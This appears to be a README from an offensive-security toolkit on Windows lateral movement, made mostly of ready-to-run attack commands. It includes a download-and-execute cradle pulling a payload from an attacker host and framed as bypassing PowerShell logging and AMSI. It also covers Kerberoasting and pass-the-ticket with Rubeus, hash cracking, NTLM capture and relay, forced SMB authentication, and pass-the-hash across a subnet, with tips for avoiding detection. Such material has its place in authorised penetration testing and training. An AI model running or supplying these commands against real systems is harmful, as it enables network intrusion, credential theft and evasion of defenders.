# Windows Lateral Movement

> Techniques for moving to other Windows hosts.

---

## Tools in This Directory

| File | Use |
|------|-----|
| `PSLessExec.cs` | Execute PS commands without PowerShell.exe (bypasses PS logging/AMSI) |
| `SharpHound.ps1` | BloodHound collector — maps AD attack paths |
| `smb_trigger.cs` | Trigger SMB auth from target to capture/relay NTLM hash |
| `SCShell.exe` | Lateral movement via Service Control Manager (no PSExec needed) |
| `Rubeus.dll` | Kerberos: Kerberoasting, AS-REP roasting, pass-the-ticket, overpass-the-hash |
| `accesschk.exe` | Sysinternals — check service/file permissions |

---

## BloodHound Enumeration (Always Do First)

```powershell
# Run SharpHound on target
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.com -ZipFileName loot.zip

# Transfer zip to Kali, start BloodHound
sudo neo4j start
bloodhound
# Import loot.zip → Find attack paths to Domain Admin
```

---

## PSLessExec (PowerShell without powershell.exe)

Use when PowerShell is blocked or logged but you need PS runspace.

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `PSLessExec`, .NET Framework 4.8
2. Paste `PSLessExec.cs`, delete defaults
3. Right-click References → Add Reference → Browse → `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`
4. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
5. Build → Build Solution → `bin\x64\Debug\PSLessExec.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /r:System.Management.Automation.dll /out:PSLessExec.exe PSLessExec.cs`

```cmd
:: Run — executes PS command without powershell.exe
.\PSLessExec.exe "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/payload.ps1')"
```

---

## SCShell Lateral Movement

Abuses `ChangeServiceConfigA` — no `CreateService` call (less monitored).

```cmd
# Syntax
.\SCShell.exe <TARGET_IP> <SERVICE_NAME> "<COMMAND>" <DOMAIN>\<USER> <PASSWORD>

# Example: execute a command via XblAuthManager service
.\SCShell.exe 192.168.1.50 XblAuthManager "C:\Windows\System32\cmd.exe /c whoami > C:\out.txt" corp\admin Password123

# Example: download and run loader
.\SCShell.exe 192.168.1.50 XblAuthManager "C:\Windows\System32\cmd.exe /c powershell -enc <B64_PAYLOAD>" corp\admin Password123
```

---

## Rubeus — Kerberos Attacks

```powershell
# Load as assembly (reflective loading)
[System.Reflection.Assembly]::LoadFile("$PWD\Rubeus.dll")
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt".Split())

# OR drop to disk and run
.\Rubeus.exe kerberoast /outfile:hashes.txt          # Kerberoasting
.\Rubeus.exe asreproast /outfile:asrep.txt            # AS-REP roasting
.\Rubeus.exe ptt /ticket:<base64_ticket>              # Pass-the-Ticket
.\Rubeus.exe asktgt /user:<USER> /ntlm:<HASH> /domain:<DOMAIN>  # Overpass-the-Hash

# Monitor for TGTs (unconstrained delegation capture)
.\Rubeus.exe monitor /interval:5 /nowrap
```

**Crack hashes on Kali:**
```bash
# Kerberoast (TGS hashes)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP roast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## SMB Auth Trigger (NTLM Relay Setup)

```bash
# 1. Start Responder on Kali (capture mode — DO NOT relay with this running)
python3 Responder.py -I eth0 -wv

# OR start ntlmrelayx for relaying
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc <B64>"

# 2. Trigger auth from target using smb_trigger.cs
# Compile (Visual Studio on Windows dev box):
#   File → New → Console App (.NET Framework), name "smb_trigger", .NET Framework 4.8
#   Paste smb_trigger.cs, Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#   Build → Build Solution → bin\x64\Debug\smb_trigger.exe
#   Alt: csc.exe /unsafe /platform:x64 /out:smb_trigger.exe smb_trigger.cs
# Run on target (forces auth to your Kali):
.\smb_trigger.exe \\<KALI_IP>\share
```

---

## Pass-the-Hash

```bash
# Impacket (from Kali)
python3 /usr/share/doc/python3-impacket/examples/psexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>
python3 /usr/share/doc/python3-impacket/examples/smbexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>

# CrackMapExec (spray a subnet)
crackmapexec smb 192.168.1.0/24 -u <USER> -H <NTHASH>
```

---

## Notes
- **Integrity level**: Injection target must be same or lower integrity than your current process
- **SCShell**: Requires at least local admin on target, but avoids `CreateService` API call
- **Rubeus reflective load**: Avoids writing .exe to disk — use from PS if possible
